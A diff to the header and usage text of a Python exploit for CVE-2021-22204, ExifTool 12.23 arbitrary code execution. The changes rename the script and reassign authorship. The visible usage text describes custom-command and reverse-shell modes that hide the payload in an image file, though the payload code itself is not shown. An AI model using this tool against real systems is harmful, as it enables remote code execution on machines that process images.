@@ -1,8 +1,9 @@
 # Exploit: ExifTool 12.23 - Arbitrary Code Execution
-# Exploit Author: UNICORD / MODIFIED BY rvick
+# Original Author: UNICORD
 # Version: 7.44-12.23
 # Tested on: ExifTool 12.23 (Debian)
 # CVE: CVE-2021-22204
+# Author: slasher (rvick)
 
 #!/usr/bin/env python3
 
@@ -34,11 +35,11 @@ def help():
     print(r"""UNICORD Exploit for CVE-2021-22204
 
 Usage:
-  python3 exploit-CVE-2021-22204.py -c <command>
-  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>
-  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]
-  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]
-  python3 exploit-CVE-2021-22204.py -h
+  python3 exift.py -c <command>
+  python3 exift.py -s <local-IP> <local-port>
+  python3 exift.py -c <command> [-i <image.jpg>]
+  python3 exift.py -s <local-IP> <local-port> [-i <image.jpg>]
+  python3 exift.py -h
 
 Options:
   -c    Custom command mode. Provide command to execute.
